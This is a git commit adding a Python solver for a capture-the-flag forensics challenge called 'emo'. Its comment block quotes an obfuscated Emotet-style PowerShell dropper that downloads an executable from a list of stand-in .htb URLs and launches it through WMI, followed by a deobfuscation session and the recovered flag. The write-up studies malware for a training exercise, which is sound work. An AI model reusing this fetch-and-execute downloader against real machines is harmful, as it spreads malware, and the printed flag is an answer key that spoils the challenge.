9bfed14d2921d38fb2e280805c2c551762491623
ShundaZhang <zhangshunda@gmail.com>
2023-04-05 21:00:30 +0800

    Solved emo!

--- ctf/forensics/emo/dec.py
+++ ctf/forensics/emo/dec.py
@@ -1,4 +1,44 @@
 #https://blog.csdn.net/qq_46241655/article/details/123740113
 #https://blog.csdn.net/qq_46241655/article/details/123751954
 
+#https://domdom.tistory.com/168
+
+'''
+a virus inspection tool. ( see https://www.virustotal.com/ )
+"pwsh.exe" -windowstyle hidden -ENCOD IABTAFYAIAAgADAAegBYACAAKABb...
+
+sv  0zx ([type]("{2}{0}{4}{3}{1}"-f 'e','rectory','syst','.io.di','m')  ) ;
+set  txyseo  (  [type]("{0}{7}{5}{6}{4}{2}{1}{8}{3}"-f'syste','tm','in','er','po','net.se','rvice','m.','anag')) ;
+$nbf5tg3=('b9'+'yp'+('90'+'s'));$vxnlre0=$cludkjx + [char](64) + $r6r1tuy;$ky3q0e8=(('rq'+'dx')+'wo'+'5');
+(  dir  variable:0zx).value::"creat`e`direc`t`ory"($home + ((('ndp'+'jrb')+('e'+'vk4n')+'d'+'p'+('c'+'cwr_2h')+'nd'+'p') -replace ('n'+'dp'),[char]92));$fn5ggmsh = (182,187,229,146,231,177,151,149,166);$pyozgeo=(('j5f'+'y1')+'c'+'c');
+(  variable txyseo  ).value::"securi`typ`r`otoc`ol" = (('tl'+'s1')+'2');$fn5ggmsh += (186,141,228,182,177,171,229,236,239,239,239,228,181,182,171,229,234,239,239,228);$huajgb0=(('jn'+'o')+'5g'+'a1');$bb28umo = (('ale'+'7g')+'_8');$hsce_js=('kv'+('nb'+'ov_'));$spk51ue=(('c'+'7xo')+'9g'+'l');$scusbkj=$home+(('5'+'t'+('f'+'jrbev'+'k')+('45tf'+'cc'+'w')+'r'+('_2h'+'5tf')) -replace  ([char]53+[char]116+[char]102),[char]92)+$bb28umo+(('.e'+'x')+'e');$fn5ggmsh += (185,179,190,184,229,151,139,157,164,235,177,239,171,183,236,141,128,187,235,134,128,158,177,176,139);$hbmskv2t=(('c'+'7xo')+'9g'+'l');$hbmskv2t=$home+(('5'+'t'+('f'+'jrbev'+'k')+('45tf'+'cc'+'w')+'r'+('_2h'+'5tf')) -replace  ([char]53+[char]116+[char]102),[char]92)+$bb28umo+(('.c'+'o')+'nf');$q1_y05_=('w'+('4'+'qvy')+'z8');$odb3hf3=&('n'+'e'+'w-object') net.webclient;$fn5ggmsh += (183,154,173,128,175,151,238,140,183,162,228,170,173,179,229);$anbyt1y=('h'+('ttp:'+']['+'(s)]')+(('w]'+'[('))+(('s)'+']w'))+('da'+'-')+'i'+'n'+'du'+('s'+'trial.'+'h'+'t')+'b]'+('[(s)]'+'w'+'js')+((']'+'[('))+(('s'+')]w9idl'+'p]['+'(s'+')]w'+'@h'))+('t'+'tp:]')+('[(s'+')]')+'w'+(']'+'[(s)]')+('wdap'+'ro'+'fesiona'+'l.h')+'tb'+('][(s'+')'+']')+'w'+('d'+'ata')+('4][(s'+')]wh')+('wgw'+'jt')+('v]'+'[')+('(s)]w@http'+'s:][(s'+')]'+'w'+']')+'['+('(s)'+']wdag'+'ra')+'ni'+'t'+('eg'+'ia')+('re.h'+'t')+'b]'+('['+'(s)')+(']ww'+'p-a'+'dm'+'in][(s)'+']wt')+('v]['+'(s'+')')+(']w@'+'h')+'tt'+'p'+(':'+'][')+('(s)]w]['+'(s'+')]www'+'w'+'.out'+'s'+'p')+('ok'+'e')+'nv'+'i'+('s'+'ions.')+('htb'+']')+'['+('(s)]w'+'wp'+'-in')+('clu'+'d')+('es][(s)'+']waw'+'o'+'m')+(']'+'[('+'s)]w')+('@'+'http:]')+('[(s)'+']w][('+'s)')+(']wmo'+'bs')+('o'+'uk.h')+(('t'+'b][('))+(('s)'+']wwp-'))+'in'+'c'+'l'+('ude'+'s]'+'[')+('(s)]'+'w')+('uy'+'30r]')+('[(s'+')]w'+'@'+'h'+'ttp:][')+('('+'s)]w')+(']['+'(s)')+(']'+'wb')+'i'+('g'+'laugh'+'s')+(('.h'+'t'+'b][(s'))+((')]'))+('ws'+'mallpot'+'ato')+'es'+((']'+'[(s'))+((')]wy]'+'[(s'+')]w'+'@h'+'ttps:][(s)'))+']w'+('][('+'s)]wn'+'g')+('ll'+'o')+('gist'+'i')+('cs.'+'h')+'t'+('b]'+'['+'('+'s)]w')+'ad'+('mi'+'n')+'er'+']'+('[(s'+')]w'+'w3m')+'k'+(('b'+'][(s'))+((')'+']w')))."rep`lace"((']'+'['+('(s)]'+'w')),([array]('/'),('xw'+'e'))[0])."sp`lit"($ivg3zcu + $vxnlre0 + $jzaewdy);$gcoyvlv=(('kf'+'_')+('9'+'et1'));foreach ($a8i3ke1 in $anbyt1y){try{$odb3hf3."do`wnloa`dfile"($a8i3ke1, $scusbkj);$zhcnaux=(('ek'+'k')+('j'+'47t'));if ((&('get-i'+'te'+'m') $scusbkj)."len`gth" -ge 45199) {${a8`i`3ke1}.("{1}{2}{0}" -f'ay','tocha','rarr').invoke() | .("{2}{1}{0}{3}" -f'-','ach','fore','object') -process { ${fn5`ggm`sh} += ([byte][char]${_} -bxor 0xdf ) };
+$fn5ggmsh += (228);
+$b0rje =  [type]("{1}{0}" -f'vert','con');
+$b0rje::"to`bas`e64s`tri`ng"(${fn5`ggm`sh}) | .("{2}{1}{0}" -f 'ile','ut-f','o') ${hb`msk`v2t};
+([wmiclass](('wi'+'n')+('32_'+'proc'+'e')+'s'+'s'))."cr`eate"($scusbkj);$glwki6a=('i'+'m'+('td'+'xv6'));break;$pfpblh1=('vs'+('lal'+'c')+'u')}}catch{}}$f47ief2=(('bn'+'zid')+'rt')
+
+PS C:\Users\domdomi\adsf> $fn5ggmsh = (182, 187, 229, 146, 231, 177, 151, 149, 166);
+>> $fn5ggmsh += (186, 141, 228, 182, 177, 171, 229, 236, 239, 239, 239, 228, 181, 182, 171, 229, 234, 239, 239, 228);
+>> $fn5ggmsh += (185, 179, 190, 184, 229, 151, 139, 157, 164, 235, 177, 239, 171, 183, 236, 141, 128, 187, 235, 134, 128, 158, 177, 176, 139);
+>> $fn5ggmsh += (183, 154, 173, 128, 175, 151, 238, 140, 183, 162, 228, 170, 173, 179, 229);
+>>
+>> $anbyt1y = @('http://da-industrial.htb/js/9idlp/','http://daprofesional.htb/data4/hwgwjtv/','https://dagranitegiare.htb/wp-admin/tv/','http://www.outspokenvisions.htb/wp-includes/awom/','http://mobsouk.htb/wp-includes/uy30r/','http://biglaughs.htb/smallpotatoes/y/','https://ngllogistics.htb/adminer/w3mkb/');
+>> $anbyt1y[0].('tochararray').invoke() | .('foreach-object') -process {
+>>     ${fn5ggmsh} += ([byte][char]${_} -bxor 0xdf)
+>> };
+>> $fn5ggmsh += (228);
+>> $b0rje = [type]('convert');
+>> echo $b0rje::"tobase64string"(${fn5ggmsh})"";
+trvlkuexl5Wmuo3ktrGr5ezv7+/ktbar5erv7+S5s7645ZeLnaTrse+rt+yNgLvrhoCesbCLt5qtgK+X7oy3ouSqrbPlt6urr+Xw8Lu+8raxu6qsq622vrPxt6u98LWs8Oa2u7Ov8OQ=
+
+'''
+
+from pwn import *
+
+with open('flag_xor.bin', 'rb') as f:
+	buf = f.read()
+
+print xor(buf, 0xdf)
+
+#id:M8nHJyeR;int:3000;jit:500;flag:HTB{4n0th3R_d4Y_AnoThEr_pH1Sh};url:http://da-industrial.htb/js/9idlp/;
 
